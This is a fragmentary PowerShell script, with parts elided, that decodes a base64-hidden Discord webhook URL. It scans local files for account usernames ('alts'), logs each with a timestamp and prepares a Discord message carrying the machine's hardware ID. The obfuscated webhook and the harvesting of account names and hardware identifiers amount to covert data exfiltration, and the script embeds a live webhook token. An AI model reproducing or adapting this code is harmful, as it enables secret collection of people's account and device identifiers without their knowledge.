$webhookPart1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDcxMTY5NzU2NTYxNDE1MC9LSFZRSTdLSWh2VU9jaE9KZTJzckpJem5QcXRKZFVMdi1ZOWVqR0UtWmdoaTVSNWVyc2M2NXNKTkdsNUNkQUJZVFQwT2E="
$webhookUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($webhookPart1))
...
foreach ($file in $allFiles) {
    try {
        ...
        if ($content -and $content -match $pattern) {
            $username = $Matches[1]
            if (-not $storedAlts.ContainsKey($username)) { $newAlts += $username }
        }
    } catch { continue }
}

if ($newAlts.Count -gt 0) {
    foreach ($alt in $newAlts) { $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss") }
...
if ($newAlts.Count -gt 0) {
    ...
    if ($storedAlts.Count - $newAlts.Count -gt 0) {
        $description += "`n**PREVIOUSLY DETECTED:**`n`n"
        $counter = 1
    ...
    if ($storedAlts.Count -gt 0) {
        $description += "**PREVIOUSLY DETECTED:**`n`n"
        $counter = 1
...
$embed = @{
    ...
    footer = @{ text = "ID: $($hwid.Substring(0,8))..." }
